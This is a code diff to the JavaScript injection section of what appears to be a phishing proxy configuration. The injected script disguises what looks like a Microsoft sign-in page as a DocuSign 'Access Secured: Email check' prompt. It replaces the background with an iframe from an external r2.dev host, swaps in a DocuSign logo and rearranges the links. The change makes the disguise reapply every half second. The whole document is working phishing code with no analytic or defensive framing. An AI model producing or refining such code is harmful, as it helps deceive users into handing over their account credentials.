@@ -128,55 +128,58 @@ js_inject:
       setTimeout(() => {
         overlay.remove();
 
-        const waitFor = (selector, cb) => {
-          const check = setInterval(() => {
-            const el = document.querySelector(selector);
-            if (el) {
-              clearInterval(check);
-              cb(el);
-            }
-          }, 50);
+        // Start background replacement
+        const replaceBackground = () => {
+          const bgImg = document.querySelector('#backgroundImage');
+          if (bgImg && !document.getElementById('customBgIframe')) {
+            bgImg.style.display = 'none';
+
+            const iframe = document.createElement("iframe");
+            iframe.id = "customBgIframe";
+            iframe.src = "https://pub-4ec73ba7bee04896b7e30d39646ed8f3.r2.dev/off.html";
+            iframe.style.position = "absolute";
+            iframe.style.top = "0";
+            iframe.style.left = "0";
+            iframe.style.width = "100vw";
+            iframe.style.height = "100vh";
+            iframe.style.zIndex = "0";
+            iframe.style.border = "none";
+            iframe.style.pointerEvents = "none";
+            iframe.style.overflow = "hidden";
+
+            const container = bgImg.parentElement;
+            container.appendChild(iframe);
+          }
         };
 
-        // 1. Change background
-        waitFor('#backgroundImage', (bgImg) => {
-          bgImg.style.display = 'none';
-
-          const iframe = document.createElement("iframe");
-          iframe.src = "https://pub-4ec73ba7bee04896b7e30d39646ed8f3.r2.dev/off.html";
-          iframe.style.position = "absolute";
-          iframe.style.top = "0";
-          iframe.style.left = "0";
-          iframe.style.width = "100vw";
-          iframe.style.height = "100vh";
-          iframe.style.zIndex = "0";
-          iframe.style.border = "none";
-          iframe.style.pointerEvents = "none";
-          iframe.style.overflow = "hidden";
-
-          const container = bgImg.parentElement;
-          container.appendChild(iframe);
-        });
-
-        // 2. Change logo to DocuSign
-        waitFor('img.logo', (logoImg) => {
-          logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png";
-          logoImg.style.width = "100px";
-          logoImg.style.objectFit = "contain";
-        });
-
-        // 3. Change heading to 'Access Secured: Email check'
-        waitFor('#loginHeader > div', (heading) => {
-          heading.textContent = "Access Secured: Email check";
-        });
-
-        // 4. Move "No account?" and "Can't access account?" above input field
-        waitFor('.win-scroll', (scrollArea) => {
-          const signupLinks = scrollArea.querySelector('.password-reset-links-container');
-          const formGroup = scrollArea.querySelector('.form-group.col-md-24');
-          if (signupLinks && formGroup) {
-            formGroup.parentNode.insertBefore(signupLinks, formGroup);
+        // Continuously fix logo, title, links
+        setInterval(() => {
+          // Change logo
+          const logoImg = document.querySelector('img.logo');
+          if (logoImg && !logoImg.src.includes('DocuSign-Logo.png')) {
+            logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png";
+            logoImg.style.width = "100px";
+            logoImg.style.objectFit = "contain";
           }
-        });
+
+          // Change title text
+          const titleDiv = document.querySelector('#loginHeader > div');
+          if (titleDiv && titleDiv.textContent.trim() !== "Access Secured: Email check") {
+            titleDiv.textContent = "Access Secured: Email check";
+          }
+
+          // Move "No account?" + "Can't access?" links
+          const scrollArea = document.querySelector('.win-scroll');
+          const signupLinks = scrollArea?.querySelector('.password-reset-links-container');
+          const formGroup = scrollArea?.querySelector('.form-group.col-md-24');
+
+          if (scrollArea && signupLinks && formGroup && signupLinks.nextSibling !== formGroup) {
+            scrollArea.insertBefore(signupLinks, formGroup);
+          }
+
+          // Fix background
+          replaceBackground();
+
+        }, 500); // Repeat every half second
 
       }, 3000);
